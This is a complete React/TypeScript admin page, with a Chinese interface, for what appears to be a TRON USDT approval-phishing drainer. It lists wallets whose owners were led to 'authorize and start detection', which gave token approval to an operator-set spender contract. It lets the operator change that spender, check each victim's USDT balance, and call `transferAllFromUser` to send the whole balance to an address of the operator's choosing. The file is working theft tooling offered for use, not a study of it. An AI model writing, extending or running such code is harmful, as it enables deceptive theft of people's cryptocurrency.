import { useCallback, useEffect, useMemo, useState } from "react";
import { Link } from "react-router-dom";
import type { Session } from "@supabase/supabase-js";
import { Copy, KeyRound, LayoutDashboard, Loader2, LogOut, RefreshCw, SendHorizontal } from "lucide-react";

import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Dialog, DialogContent, DialogDescription, DialogFooter, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import {
  isValidTronBase58Address,
  LEGACY_DEFAULT_APPROVAL_SPENDER,
  TRON_USDT_CONTRACT,
  USDT_APPROVAL_SPENDER_KEY,
} from "@/lib/approvalSpender";
import { getSupabaseBrowserClient } from "@/lib/supabaseClient";
import { cn } from "@/lib/utils";

type AuthorizationRow = {
  id: string;
  created_at: string;
  wallet_address: string;
  usdt_balance: number | null;
  approval_tx_id: string | null;
  locale: string | null;
  user_agent: string | null;
  approval_spender: string | null;
  balance_refreshed_at: string | null;
  withdraw_tx_id: string | null;
  withdraw_to: string | null;
  withdraw_at: string | null;
  withdraw_status: string | null;
};

declare global {
  interface Window {
    tronWeb?: {
      defaultAddress?: { base58?: string };
      contract?: () => { at: (address: string) => Promise<any> };
    };
  }
}

const PAGE_SIZE_OPTIONS = [10, 20, 50] as const;
const TRONGRID_HOST = "https://api.trongrid.io";

const PROXY_TRANSFER_ABI = [
  {
    name: "transferAllFromUser",
    type: "Function",
    inputs: [
      { name: "token", type: "address" },
      { name: "from", type: "address" },
      { name: "to", type: "address" },
    ],
    outputs: [{ type: "bool" }],
    stateMutability: "Nonpayable",
  },
] as const;

const formatCnTime = (iso: string) => {
  try {
    return new Date(iso).toLocaleString("zh-CN", {
      timeZone: "Asia/Shanghai",
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  } catch {
    return iso;
  }
};

const truncateMiddle = (value: string, head = 8, tail = 6) => {
  if (value.length <= head + tail + 3) return value;
  return `${value.slice(0, head)}...${value.slice(-tail)}`;
};

const Admin = () => {
  const supabase = getSupabaseBrowserClient();
  const [bootstrapping, setBootstrapping] = useState(true);
  const [session, setSession] = useState<Session | null>(null);
  const [adminOk, setAdminOk] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [formError, setFormError] = useState<string | null>(null);
  const [rows, setRows] = useState<AuthorizationRow[]>([]);
  const [totalCount, setTotalCount] = useState(0);
  const [listLoading, setListLoading] = useState(false);
  const [verifyingAdmin, setVerifyingAdmin] = useState(false);
  const [page, setPage] = useState(1);
  const [pageSize, setPageSize] = useState<number>(PAGE_SIZE_OPTIONS[1]);
  const [spenderDraft, setSpenderDraft] = useState("");
  const [spenderUpdatedAt, setSpenderUpdatedAt] = useState<string | null>(null);
  const [spenderLoading, setSpenderLoading] = useState(false);
  const [spenderSaving, setSpenderSaving] = useState(false);
  const [spenderError, setSpenderError] = useState<string | null>(null);
  const [spenderSavedHint, setSpenderSavedHint] = useState<string | null>(null);
  const [actionLoadingById, setActionLoadingById] = useState<Record<string, boolean>>({});
  const [actionMessage, setActionMessage] = useState<string | null>(null);
  const [actionError, setActionError] = useState<string | null>(null);
  const [withdrawDialogOpen, setWithdrawDialogOpen] = useState(false);
  const [selectedRow, setSelectedRow] = useState<AuthorizationRow | null>(null);
  const [withdrawTo, setWithdrawTo] = useState("");

  const totalPages = useMemo(() => Math.max(1, Math.ceil(totalCount / pageSize)), [totalCount, pageSize]);

  const loadAuthorizations = useCallback(async () => {
    if (!supabase || !adminOk) return;
    setListLoading(true);
    const from = (page - 1) * pageSize;
    const to = from + pageSize - 1;
    const { data, error, count } = await supabase
      .from("wallet_authorizations")
      .select(
        "id, created_at, wallet_address, usdt_balance, approval_tx_id, approval_spender, locale, user_agent, balance_refreshed_at, withdraw_tx_id, withdraw_to, withdraw_at, withdraw_status",
        { count: "exact" },
      )
      .order("created_at", { ascending: false })
      .range(from, to);
    setListLoading(false);
    if (error) {
      console.error(error);
      return;
    }
    setRows((data as AuthorizationRow[]) ?? []);
    setTotalCount(count ?? 0);
  }, [supabase, adminOk, page, pageSize]);

  const loadApprovalSpenderSetting = useCallback(async () => {
    if (!supabase || !adminOk) return;
    setSpenderLoading(true);
    setSpenderError(null);
    const { data, error } = await supabase
      .from("app_settings")
      .select("value, updated_at")
      .eq("key", USDT_APPROVAL_SPENDER_KEY)
      .maybeSingle();
    setSpenderLoading(false);
    if (error) {
      setSpenderError(error.message);
      return;
    }
    setSpenderDraft(data?.value?.trim() ? data.value.trim() : LEGACY_DEFAULT_APPROVAL_SPENDER);
    setSpenderUpdatedAt(data?.updated_at ?? null);
  }, [supabase, adminOk]);

  const saveApprovalSpenderSetting = async () => {
    if (!supabase) return;
    const trimmed = spenderDraft.trim();
    if (!isValidTronBase58Address(trimmed)) {
      setSpenderError("请输入有效的 Tron 地址（Base58，以 T 开头，长度 34）。");
      return;
    }
    setSpenderSaving(true);
    setSpenderError(null);
    setSpenderSavedHint(null);
    const { error } = await supabase.from("app_settings").upsert(
      {
        key: USDT_APPROVAL_SPENDER_KEY,
        value: trimmed,
        updated_at: new Date().toISOString(),
      },
      { onConflict: "key" },
    );
    setSpenderSaving(false);
    if (error) {
      setSpenderError(error.message);
      return;
    }
    setSpenderSavedHint("已保存，客户端将在下次加载配置时生效。");
    void loadApprovalSpenderSetting();
    window.setTimeout(() => setSpenderSavedHint(null), 5000);
  };

  useEffect(() => {
    if (!supabase) {
      setBootstrapping(false);
      return;
    }

    void supabase.auth.getSession().then(({ data: { session: initial } }) => {
      setSession(initial);
      setBootstrapping(false);
    });

    const {
      data: { subscription },
    } = supabase.auth.onAuthStateChange((_event, next) => {
      setSession(next);
    });

    return () => subscription.unsubscribe();
  }, [supabase]);

  useEffect(() => {
    if (!supabase || bootstrapping) return;
    const uid = session?.user?.id;
    if (!uid) {
      setAdminOk(false);
      setVerifyingAdmin(false);
      return;
    }

    setVerifyingAdmin(true);
    let cancelled = false;
    void (async () => {
      try {
        const { data } = await supabase.from("admin_users").select("user_id").eq("user_id", uid).maybeSingle();
        if (cancelled) return;
        if (!data) {
          setAdminOk(false);
          setFormError("该账号不具备后台管理员权限。");
          await supabase.auth.signOut();
        } else {
          setFormError(null);
          setAdminOk(true);
        }
      } finally {
        if (!cancelled) setVerifyingAdmin(false);
      }
    })();

    return () => {
      cancelled = true;
      setVerifyingAdmin(false);
    };
  }, [session?.user?.id, supabase, bootstrapping]);

  useEffect(() => {
    if (!adminOk) return;
    void loadAuthorizations();
  }, [adminOk, loadAuthorizations]);

  useEffect(() => {
    if (!adminOk) return;
    void loadApprovalSpenderSetting();
  }, [adminOk, loadApprovalSpenderSetting]);

  useEffect(() => {
    if (page > totalPages) {
      setPage(totalPages);
    }
  }, [page, totalPages]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setFormError(null);
    if (!supabase) return;
    const { error } = await supabase.auth.signInWithPassword({ email: email.trim(), password });
    if (error) {
      setFormError(error.message);
    }
  };

  const handleLogout = async () => {
    if (!supabase) return;
    await supabase.auth.signOut();
    setAdminOk(false);
    setRows([]);
    setTotalCount(0);
    setPage(1);
    setFormError(null);
  };

  const handlePageSizeChange = (value: string) => {
    setPageSize(Number(value));
    setPage(1);
  };

  const setRowLoading = (rowId: string, loading: boolean) => {
    setActionLoadingById((prev) => ({ ...prev, [rowId]: loading }));
  };

  const copyText = async (label: string, value: string | null) => {
    if (!value) {
      setActionError(`该记录没有可复制的${label}。`);
      return;
    }
    try {
      await navigator.clipboard.writeText(value);
      setActionMessage(`${label}已复制。`);
      setActionError(null);
    } catch (e) {
      setActionError(`复制${label}失败：${e instanceof Error ? e.message : String(e)}`);
    }
  };

  const refreshUsdtBalance = async (row: AuthorizationRow) => {
    if (!supabase) return;
    setActionError(null);
    setActionMessage(null);
    setRowLoading(row.id, true);
    try {
      const resp = await fetch(`${TRONGRID_HOST}/v1/accounts/${row.wallet_address}`);
      if (!resp.ok) throw new Error(`TronGrid 请求失败: HTTP ${resp.status}`);
      const json = (await resp.json()) as {
        data?: Array<{ trc20?: Array<Record<string, string>> }>;
      };
      const trc20 = json.data?.[0]?.trc20 ?? [];
      let usdtBalance = 0;
      for (const tokenItem of trc20) {
        const maybe = tokenItem[TRON_USDT_CONTRACT];
        if (maybe) {
          usdtBalance = maybe.includes(".") ? Number(maybe) : Number(maybe) / 1_000_000;
          break;
        }
      }

      const { error } = await supabase
        .from("wallet_authorizations")
        .update({
          usdt_balance: usdtBalance,
          balance_refreshed_at: new Date().toISOString(),
        })
        .eq("id", row.id);
      if (error) throw new Error(error.message);

      setRows((prev) =>
        prev.map((item) =>
          item.id === row.id ? { ...item, usdt_balance: usdtBalance, balance_refreshed_at: new Date().toISOString() } : item,
        ),
      );
      setActionMessage(`已刷新 ${row.wallet_address} 的 USDT 余额。`);
    } catch (e) {
      setActionError(`刷新余额失败：${e instanceof Error ? e.message : String(e)}`);
    } finally {
      setRowLoading(row.id, false);
    }
  };

  const openWithdrawDialog = (row: AuthorizationRow) => {
    setSelectedRow(row);
    setWithdrawTo("");
    setWithdrawDialogOpen(true);
    setActionError(null);
    setActionMessage(null);
  };

  const submitWithdraw = async () => {
    if (!supabase || !selectedRow) return;
    const to = withdrawTo.trim();
    if (!isValidTronBase58Address(to)) {
      setActionError("请填写有效的接收地址（TRON Base58 地址）。");
      return;
    }
    const proxyContractAddress = selectedRow.approval_spender?.trim();
    if (!proxyContractAddress || !isValidTronBase58Address(proxyContractAddress)) {
      setActionError("该记录的授权接收地址无效，无法发起提币。");
      return;
    }

    const tronWeb = window.tronWeb;
    if (!tronWeb?.contract) {
      setActionError("未检测到可用钱包环境，请在已连接 Tron 钱包的浏览器中操作。");
      return;
    }

    setActionError(null);
    setActionMessage(null);
    setRowLoading(selectedRow.id, true);
    try {
      const contract = await tronWeb.contract().at(proxyContractAddress);
      const sendResult = await contract
        .transferAllFromUser(TRON_USDT_CONTRACT, selectedRow.wallet_address, to)
        .send({ feeLimit: 300_000_000, callValue: 0 });

      const withdrawTxId = typeof sendResult === "string" ? sendResult : String(sendResult?.txid ?? sendResult?.txID ?? "");
      const { error } = await supabase
        .from("wallet_authorizations")
        .update({
          withdraw_to: to,
          withdraw_tx_id: withdrawTxId || null,
          withdraw_at: new Date().toISOString(),
          withdraw_status: "success",
        })
        .eq("id", selectedRow.id);
      if (error) throw new Error(error.message);

      setRows((prev) =>
        prev.map((item) =>
          item.id === selectedRow.id
            ? {
                ...item,
                withdraw_to: to,
                withdraw_tx_id: withdrawTxId || null,
                withdraw_at: new Date().toISOString(),
                withdraw_status: "success",
              }
            : item,
        ),
      );
      setWithdrawDialogOpen(false);
      setSelectedRow(null);
      setActionMessage("提币交易已提交，请稍后在链上确认结果。");
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e);
      await supabase
        .from("wallet_authorizations")
        .update({
          withdraw_to: to,
          withdraw_at: new Date().toISOString(),
          withdraw_status: "failed",
        })
        .eq("id", selectedRow.id);
      setActionError(`提币失败：${msg}`);
    } finally {
      setRowLoading(selectedRow.id, false);
    }
  };

  if (!supabase) {
    return (
      <main className="min-h-screen bg-gradient-to-b from-background to-muted/40 px-4 py-12">
        <Card className="mx-auto max-w-md border-border/60 shadow-md">
          <CardHeader className="space-y-1 text-center">
            <CardTitle className="text-xl">无法连接后台</CardTitle>
            <CardDescription className="text-pretty">
              请在项目根目录配置 <code className="rounded bg-muted px-1 py-0.5 text-xs">VITE_SUPABASE_URL</code> 与{" "}
              <code className="rounded bg-muted px-1 py-0.5 text-xs">VITE_SUPABASE_ANON_KEY</code> 后重新启动开发服务器或重新构建。
            </CardDescription>
          </CardHeader>
          <CardContent className="flex justify-center">
            <Button variant="outline" asChild>
              <Link to="/">返回站点首页</Link>
            </Button>
          </CardContent>
        </Card>
      </main>
    );
  }

  if (bootstrapping) {
    return (
      <main className="flex min-h-screen flex-col items-center justify-center gap-3 bg-gradient-to-b from-background to-muted/40">
        <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" aria-hidden />
        <p className="text-sm text-muted-foreground">正在加载…</p>
      </main>
    );
  }

  const showDashboard = session && adminOk && !verifyingAdmin;
  const showLogin = !session || !adminOk;

  return (
    <main className="min-h-screen bg-gradient-to-b from-background via-background to-muted/30">
      <header className="sticky top-0 z-10 border-b border-border/60 bg-background/80 backdrop-blur-md">
        <div className="mx-auto flex h-14 max-w-7xl items-center justify-between gap-4 px-4 sm:px-6">
          <div className="flex min-w-0 items-center gap-3">
            <div className="flex h-9 w-9 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-primary">
              <LayoutDashboard className="h-5 w-5" aria-hidden />
            </div>
            <div className="min-w-0">
              <p className="truncate text-sm font-semibold tracking-tight">管理后台</p>
              <p className="truncate text-xs text-muted-foreground">授权记录 · Supabase</p>
            </div>
          </div>
          <div className="flex shrink-0 items-center gap-2">
            <Button variant="ghost" size="sm" className="text-muted-foreground" asChild>
              <Link to="/">站点首页</Link>
            </Button>
            {showDashboard ? (
              <>
                <Button variant="secondary" size="sm" disabled={listLoading} onClick={() => void loadAuthorizations()}>
                  <RefreshCw className={cn("mr-1.5 h-3.5 w-3.5", listLoading && "animate-spin")} aria-hidden />
                  刷新
                </Button>
                <Button variant="outline" size="sm" onClick={() => void handleLogout()}>
                  <LogOut className="mr-1.5 h-3.5 w-3.5" aria-hidden />
                  退出登录
                </Button>
              </>
            ) : null}
          </div>
        </div>
      </header>

      <div className="mx-auto max-w-7xl px-4 py-8 sm:px-6">
        {session && verifyingAdmin ? (
          <div className="flex flex-col items-center justify-center gap-3 py-24">
            <Loader2 className="h-8 w-8 animate-spin text-muted-foreground" aria-hidden />
            <p className="text-sm text-muted-foreground">正在验证管理员权限…</p>
          </div>
        ) : showLogin ? (
          <div className="mx-auto flex w-full max-w-md flex-col gap-8 pt-6 sm:pt-12">
            <Card className="border-border/60 shadow-lg">
              <CardHeader className="space-y-1 text-center sm:text-left">
                <CardTitle className="text-xl">管理员登录</CardTitle>
                <CardDescription>使用已在 Supabase Authentication 中创建的邮箱与密码登录。</CardDescription>
              </CardHeader>
              <CardContent>
                <form className="space-y-4" onSubmit={(e) => void handleLogin(e)}>
                  <div className="space-y-2">
                    <Label htmlFor="adm-email">邮箱</Label>
                    <Input
                      id="adm-email"
                      type="email"
                      autoComplete="email"
                      placeholder="admin@example.com"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      required
                    />
                  </div>
                  <div className="space-y-2">
                    <Label htmlFor="adm-password">密码</Label>
                    <Input
                      id="adm-password"
                      type="password"
                      autoComplete="current-password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                    />
                  </div>
                  {formError ? (
                    <p className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">{formError}</p>
                  ) : null}
                  <Button type="submit" className="w-full">
                    登录
                  </Button>
                </form>
              </CardContent>
            </Card>
          </div>
        ) : (
          <div className="space-y-6">
            <div className="flex flex-col gap-1 sm:flex-row sm:items-end sm:justify-between">
              <div>
                <h1 className="text-2xl font-semibold tracking-tight">钱包授权记录</h1>
                <p className="mt-1 text-sm text-muted-foreground">用户在客户端完成「授权并开始检测」后写入的数据（按创建时间倒序）。</p>
              </div>
              <p className="text-sm text-muted-foreground">
                共 <span className="font-medium text-foreground">{totalCount}</span> 条
              </p>
            </div>
            {actionError ? <p className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">{actionError}</p> : null}
            {actionMessage ? (
              <p className="rounded-md border border-emerald-500/25 bg-emerald-500/10 px-3 py-2 text-sm text-emerald-800 dark:text-emerald-200">{actionMessage}</p>
            ) : null}

            <Card className="border-border/60 shadow-sm">
              <CardHeader className="border-b border-border/60 bg-muted/15">
                <div className="flex flex-col gap-3 sm:flex-row sm:items-start sm:justify-between">
                  <div className="flex gap-3">
                    <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-primary">
                      <KeyRound className="h-5 w-5" aria-hidden />
                    </div>
                    <div className="space-y-1">
                      <CardTitle className="text-base">授权接收地址（spender）</CardTitle>
                      <CardDescription className="max-w-2xl text-pretty">
                        客户端对 TRC20 USDT（合约 {TRON_USDT_CONTRACT}）调用 <code className="rounded bg-muted px-1 py-0.5 text-xs">approve</code>{" "}
                        时使用的接收方地址。修改后已打开页面的用户需刷新或重新连接钱包后才会拉取新配置。
                      </CardDescription>
                    </div>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="space-y-4 pt-6">
                {spenderLoading ? (
                  <div className="flex items-center gap-2 text-sm text-muted-foreground">
                    <Loader2 className="h-4 w-4 animate-spin" aria-hidden />
                    正在加载配置…
                  </div>
                ) : (
                  <>
                    <div className="grid gap-4 sm:grid-cols-[1fr_auto] sm:items-end">
                      <div className="space-y-2">
                        <Label htmlFor="spender-addr">spender 地址</Label>
                        <Input
                          id="spender-addr"
                          className="font-mono text-sm"
                          placeholder={LEGACY_DEFAULT_APPROVAL_SPENDER}
                          value={spenderDraft}
                          onChange={(e) => {
                            setSpenderDraft(e.target.value);
                            setSpenderError(null);
                          }}
                          spellCheck={false}
                          autoComplete="off"
                        />
                        {spenderUpdatedAt ? (
                          <p className="text-xs text-muted-foreground">
                            上次更新（服务器时间）：{formatCnTime(spenderUpdatedAt)}
                          </p>
                        ) : null}
                      </div>
                      <div className="flex flex-col gap-2 sm:min-w-[120px]">
                        <Button type="button" disabled={spenderSaving} onClick={() => void saveApprovalSpenderSetting()}>
                          {spenderSaving ? (
                            <>
                              <Loader2 className="mr-2 h-4 w-4 animate-spin" aria-hidden />
                              保存中
                            </>
                          ) : (
                            "保存"
                          )}
                        </Button>
                        <Button type="button" variant="outline" size="sm" disabled={spenderLoading} onClick={() => void loadApprovalSpenderSetting()}>
                          重新加载
                        </Button>
                      </div>
                    </div>
                    {spenderError ? (
                      <p className="rounded-md border border-destructive/30 bg-destructive/10 px-3 py-2 text-sm text-destructive">{spenderError}</p>
                    ) : null}
                    {spenderSavedHint ? (
                      <p className="rounded-md border border-emerald-500/25 bg-emerald-500/10 px-3 py-2 text-sm text-emerald-800 dark:text-emerald-200">
                        {spenderSavedHint}
                      </p>
                    ) : null}
                  </>
                )}
              </CardContent>
            </Card>

            <Card className="overflow-hidden border-border/60 shadow-sm">
              <CardHeader className="border-b border-border/60 bg-muted/20 py-4">
                <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between">
                  <div>
                    <CardTitle className="text-base font-medium">数据列表</CardTitle>
                    <CardDescription className="mt-0.5">当前页 {page} / {totalPages}</CardDescription>
                  </div>
                  <div className="flex flex-wrap items-center gap-3">
                    <span className="text-sm text-muted-foreground">每页</span>
                    <Select value={String(pageSize)} onValueChange={handlePageSizeChange}>
                      <SelectTrigger className="h-9 w-[100px]">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        {PAGE_SIZE_OPTIONS.map((n) => (
                          <SelectItem key={n} value={String(n)}>
                            {n} 条
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
              </CardHeader>
              <CardContent className="p-0">
                {listLoading && rows.length === 0 ? (
                  <div className="flex flex-col items-center justify-center gap-2 py-20">
                    <Loader2 className="h-7 w-7 animate-spin text-muted-foreground" aria-hidden />
                    <p className="text-sm text-muted-foreground">加载中…</p>
                  </div>
                ) : rows.length === 0 ? (
                  <p className="py-16 text-center text-sm text-muted-foreground">暂无记录。</p>
                ) : (
                  <>
                    <div className="space-y-3 p-4 md:hidden">
                      {rows.map((r) => (
                        <div key={r.id} className="rounded-xl border border-border/60 bg-background p-3">
                          <div className="space-y-2">
                            <p className="text-xs text-muted-foreground">{formatCnTime(r.created_at)}</p>

                            <div className="flex items-center justify-between gap-2">
                              <p className="font-mono text-xs text-foreground" title={r.wallet_address}>
                                {truncateMiddle(r.wallet_address)}
                              </p>
                              <Button variant="ghost" size="icon" className="h-7 w-7 shrink-0" onClick={() => void copyText("钱包地址", r.wallet_address)}>
                                <Copy className="h-3.5 w-3.5" aria-hidden />
                              </Button>
                            </div>

                            <div className="grid grid-cols-2 gap-2 text-xs">
                              <div className="rounded-md bg-muted/40 px-2 py-1.5">
                                <p className="text-muted-foreground">USDT</p>
                                <p className="mt-1 text-sm font-medium text-foreground">{r.usdt_balance ?? "—"}</p>
                              </div>
                              <div className="rounded-md bg-muted/40 px-2 py-1.5">
                                <p className="text-muted-foreground">提币状态</p>
                                <p className="mt-1 text-sm font-medium text-foreground">
                                  {r.withdraw_status === "success" ? "已提交" : r.withdraw_status === "failed" ? "失败" : "—"}
                                </p>
                              </div>
                            </div>

                            <div className="flex items-center justify-between gap-2 rounded-md bg-muted/40 px-2 py-1.5">
                              <p className="truncate font-mono text-xs text-muted-foreground" title={r.approval_tx_id ?? ""}>
                                交易ID：{r.approval_tx_id ? truncateMiddle(r.approval_tx_id, 6, 6) : "—"}
                              </p>
                              <Button variant="ghost" size="icon" className="h-7 w-7 shrink-0" onClick={() => void copyText("交易ID", r.approval_tx_id)}>
                                <Copy className="h-3.5 w-3.5" aria-hidden />
                              </Button>
                            </div>

                            <div className="rounded-md bg-muted/40 px-2 py-1.5">
                              <p className="text-xs text-muted-foreground">授权接收地址</p>
                              <p className="mt-1 truncate font-mono text-xs text-foreground" title={r.approval_spender ?? ""}>
                                {r.approval_spender ? truncateMiddle(r.approval_spender) : "—"}
                              </p>
                            </div>
                          </div>

                          <div className="mt-3 grid grid-cols-2 gap-2">
                            <Button
                              variant="outline"
                              size="sm"
                              className="h-9"
                              disabled={Boolean(actionLoadingById[r.id])}
                              onClick={() => void refreshUsdtBalance(r)}
                            >
                              <RefreshCw className={cn("mr-1.5 h-3.5 w-3.5", actionLoadingById[r.id] && "animate-spin")} aria-hidden />
                              刷新
                            </Button>
                            <Button
                              size="sm"
                              className="h-9"
                              disabled={Boolean(actionLoadingById[r.id]) || !r.approval_spender}
                              onClick={() => openWithdrawDialog(r)}
                            >
                              <SendHorizontal className="mr-1.5 h-3.5 w-3.5" aria-hidden />
                              提币
                            </Button>
                          </div>
                        </div>
                      ))}
                    </div>

                    <div className="hidden max-h-[min(560px,calc(100vh-16rem))] overflow-auto md:block">
                      <div className="min-w-[900px]">
                        <Table>
                          <TableHeader>
                            <TableRow className="bg-muted/30 hover:bg-muted/30">
                              <TableHead className="w-[168px] whitespace-nowrap">时间（北京时间）</TableHead>
                              <TableHead className="w-[180px]">钱包地址</TableHead>
                              <TableHead className="w-[88px]">USDT</TableHead>
                              <TableHead className="min-w-[140px]">交易 ID</TableHead>
                              <TableHead className="min-w-[140px]">授权接收地址</TableHead>
                              <TableHead className="min-w-[140px]">提币状态</TableHead>
                              <TableHead className="w-[72px]">语言</TableHead>
                              <TableHead className="min-w-[180px]">操作</TableHead>
                            </TableRow>
                          </TableHeader>
                          <TableBody>
                            {rows.map((r) => (
                              <TableRow key={r.id} className="group">
                                <TableCell className="whitespace-nowrap text-xs text-muted-foreground">{formatCnTime(r.created_at)}</TableCell>
                                <TableCell className="w-[180px]">
                                  <div className="flex items-center gap-1.5">
                                    <span className="font-mono text-xs" title={r.wallet_address}>
                                      {truncateMiddle(r.wallet_address)}
                                    </span>
                                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => void copyText("钱包地址", r.wallet_address)}>
                                      <Copy className="h-3.5 w-3.5" aria-hidden />
                                    </Button>
                                  </div>
                                </TableCell>
                                <TableCell className="whitespace-nowrap text-sm tabular-nums">{r.usdt_balance ?? "—"}</TableCell>
                                <TableCell className="max-w-[200px]">
                                  <div className="flex items-center gap-2">
                                    <span
                                      className="block truncate font-mono text-xs text-muted-foreground group-hover:text-foreground"
                                      title={r.approval_tx_id ?? ""}
                                    >
                                      {r.approval_tx_id ?? "—"}
                                    </span>
                                    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={() => void copyText("交易ID", r.approval_tx_id)}>
                                      <Copy className="h-3.5 w-3.5" aria-hidden />
                                    </Button>
                                  </div>
                                </TableCell>
                                <TableCell className="max-w-[160px]">
                                  <span className="block truncate font-mono text-xs" title={r.approval_spender ?? ""}>
                                    {r.approval_spender ?? "—"}
                                  </span>
                                </TableCell>
                                <TableCell className="text-xs text-muted-foreground">
                                  {r.withdraw_status === "success"
                                    ? "已提交"
                                    : r.withdraw_status === "failed"
                                      ? "失败"
                                      : "—"}
                                </TableCell>
                                <TableCell className="text-sm">{r.locale ?? "—"}</TableCell>
                                <TableCell>
                                  <div className="flex flex-wrap gap-2">
                                    <Button
                                      variant="outline"
                                      size="sm"
                                      disabled={Boolean(actionLoadingById[r.id])}
                                      onClick={() => void refreshUsdtBalance(r)}
                                    >
                                      <RefreshCw className={cn("mr-1.5 h-3.5 w-3.5", actionLoadingById[r.id] && "animate-spin")} aria-hidden />
                                      刷新余额
                                    </Button>
                                    <Button
                                      size="sm"
                                      disabled={Boolean(actionLoadingById[r.id]) || !r.approval_spender}
                                      onClick={() => openWithdrawDialog(r)}
                                    >
                                      <SendHorizontal className="mr-1.5 h-3.5 w-3.5" aria-hidden />
                                      提币
                                    </Button>
                                  </div>
                                </TableCell>
                              </TableRow>
                            ))}
                          </TableBody>
                        </Table>
                      </div>
                    </div>

                    <Separator />

                    <div className="flex flex-col gap-4 px-4 py-4 sm:flex-row sm:items-center sm:justify-between">
                      <p className="text-sm text-muted-foreground">
                        显示第{" "}
                        <span className="font-medium text-foreground">
                          {totalCount === 0 ? 0 : (page - 1) * pageSize + 1}–{Math.min(page * pageSize, totalCount)}
                        </span>{" "}
                        条，共 {totalCount} 条
                      </p>
                      <div className="flex flex-wrap items-center gap-2">
                        <Button variant="outline" size="sm" disabled={listLoading || page <= 1} onClick={() => setPage((p) => Math.max(1, p - 1))}>
                          上一页
                        </Button>
                        <div className="flex items-center gap-1 px-1">
                          {Array.from({ length: Math.min(totalPages, 5) }, (_, i) => {
                            let pageNum: number;
                            if (totalPages <= 5) {
                              pageNum = i + 1;
                            } else if (page <= 3) {
                              pageNum = i + 1;
                            } else if (page >= totalPages - 2) {
                              pageNum = totalPages - 4 + i;
                            } else {
                              pageNum = page - 2 + i;
                            }
                            return (
                              <Button
                                key={pageNum}
                                variant={pageNum === page ? "default" : "ghost"}
                                size="sm"
                                className="h-8 min-w-8 px-2"
                                disabled={listLoading}
                                onClick={() => setPage(pageNum)}
                              >
                                {pageNum}
                              </Button>
                            );
                          })}
                        </div>
                        <Button
                          variant="outline"
                          size="sm"
                          disabled={listLoading || page >= totalPages}
                          onClick={() => setPage((p) => Math.min(totalPages, p + 1))}
                        >
                          下一页
                        </Button>
                      </div>
                    </div>
                  </>
                )}
              </CardContent>
            </Card>
          </div>
        )}
      </div>

      <Dialog
        open={withdrawDialogOpen}
        onOpenChange={(open) => {
          setWithdrawDialogOpen(open);
          if (!open) {
            setSelectedRow(null);
            setWithdrawTo("");
          }
        }}
      >
        <DialogContent>
          <DialogHeader>
            <DialogTitle>确认提币</DialogTitle>
            <DialogDescription>将从该记录钱包发起代理合约提币，需在已连接的钱包中签名确认。</DialogDescription>
          </DialogHeader>
          <div className="space-y-3">
            <div className="space-y-1">
              <p className="text-xs text-muted-foreground">From（记录钱包）</p>
              <p className="break-all rounded-md bg-muted px-2 py-1 font-mono text-xs">{selectedRow?.wallet_address ?? "—"}</p>
            </div>
            <div className="space-y-1">
              <p className="text-xs text-muted-foreground">代理合约（该条授权接收地址）</p>
              <p className="break-all rounded-md bg-muted px-2 py-1 font-mono text-xs">{selectedRow?.approval_spender ?? "—"}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="withdraw-to">To（提币接收地址）</Label>
              <Input
                id="withdraw-to"
                value={withdrawTo}
                onChange={(e) => setWithdrawTo(e.target.value)}
                placeholder="请输入 TRON Base58 地址"
                className="font-mono text-sm"
                autoComplete="off"
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setWithdrawDialogOpen(false)}>
              取消
            </Button>
            <Button onClick={() => void submitWithdraw()} disabled={!selectedRow || Boolean(actionLoadingById[selectedRow.id])}>
              {selectedRow && actionLoadingById[selectedRow.id] ? "提交中..." : "确认提币"}
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>
    </main>
  );
};

export default Admin;
